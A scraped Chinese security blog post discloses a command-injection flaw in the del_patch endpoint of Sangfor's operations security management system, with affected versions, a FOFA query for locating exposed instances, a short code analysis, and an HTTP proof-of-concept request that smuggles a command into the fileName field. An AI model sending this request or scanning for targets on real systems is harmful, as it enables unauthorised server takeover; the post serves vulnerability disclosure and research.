---
title: "深信服运维安全管理系统 del_patch 远程命令执行漏洞"
source: https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html
asset_dir: assets/深信服运维安全管理系统-del_patch-远程命令执行漏洞
---

# 深信服运维安全管理系统 del\_patch 远程命令执行漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2026/3/10 08:41
* 138浏览
* [0评论](#comment)
* 6分钟阅读

深入探索

VPN服务

恶意软件分析工具

Docker加速服务


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

深信服运维安全管理系统 del\_patch 接口存在远程[命令执行](https://mrxn.net/tag/rce)漏洞。攻击者可通过构造恶意的请求，利用该漏洞在目标服务器上执行任意命令，从而可能导致服务器被完全控制、敏感数据泄露等严重后果。影响范围包括所有运行存在该漏洞版本的深信服运维安全管理系统的服务器。

Windows安全工具

# 影响版本

低于 3.0.12 20241106

# fofa语法

> body="/fort/login" && header="FORTSESSIONID"

# 漏洞分析

看下 `com.sbr.fort.web.controller.system.concentrationManagement.NodePatchController#delPatch`的实现逻辑

[![深信服运维安全管理系统 del_patch 远程命令执行漏洞](images/img-001-d78b482d13d2.webp)](https://image.mrxn.net/1a5842af80844141b2538d9b02eabb42.webp)

以及

深入探索

物流软件安全

技术文章订阅

网络安全会议

[![深信服运维安全管理系统 del_patch 远程命令执行漏洞](images/img-002-f789f33cb529.webp)](https://image.mrxn.net/ebc92fe84eff4694a2db46dc97833e52.webp)

参数**fileName**无任何过滤或校验被直接拼接进**cmd**命令里执行，从而造成[命令注入](https://mrxn.net/tag/rce)漏洞。

深入探索

网络安全课程

数据库

SQL注入检测工具

# 漏洞复现

[![深信服运维安全管理系统 del_patch 远程命令执行漏洞](images/img-003-95edf58edb9c.webp)](https://image.mrxn.net/4c6f5f6e3a4f4370a520ceda847556a4.webp)

## POC

```
POST /fort/system;help/concentration_management/del_patch HTTP/1.1
Host: sangfor_osm.mrxn.net
Content-Type: application/x-www-form-urlencoded

fileName=123;RCE_POC
```

[![深信服运维安全管理系统 del_patch 远程命令执行漏洞](images/img-004-da9f893f0611.webp)](https://image.mrxn.net/12d2d8b7c8f347dabe88c6c3f823f30b.webp)

访问命令执行结果重定向文件，成功获取到[命令执行](https://mrxn.net/tag/rce)结果。

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#0day](https://mrxn.net/tag/0day)
* [#rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [5.1.POC](#toc-5-1-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)  
文章链接：<https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

漏洞修复方案

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sangfor\_osm-system-concentration\_management-del\_patch-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 plus\_get\_favicon 任意文件上传漏洞](https://mrxn.net/jswz/bigant-plus_get_favicon-upload.html)

Windows安全工具

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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